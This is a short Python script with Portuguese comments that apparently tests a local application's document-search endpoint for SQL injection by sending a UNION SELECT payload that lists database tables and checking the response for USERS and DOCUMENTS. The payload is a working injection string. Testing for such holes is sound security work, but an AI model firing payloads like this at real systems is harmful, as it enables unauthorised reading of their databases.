import urllib.parse
import requests

# Criação da variável de texto
payload = ' UNION SELECT TABLE_NAME, NULL, NULL FROM INFORMATION_SCHEMA.TABLES--'

# Função para executar o payload
def executar_payload(payload):
    encoded_payload = urllib.parse.quote_plus(payload)
    url = f'http://localhost:8080/api/documents/search?query={encoded_payload}'
    response = requests.get(url)
    return response.json()

# Análise da resposta
def analisar_resposta(resposta):
    tabelas_proibidas = ['USERS', 'DOCUMENTS']
    for tabela in tabelas_proibidas:
        if tabela in str(resposta):
            print('Vulnerabilidade de Injeção SQL detetada no parâmetro de busca')
            break

# Executa o payload e analisa a resposta
resposta = executar_payload(payload)
analisar_resposta(resposta)
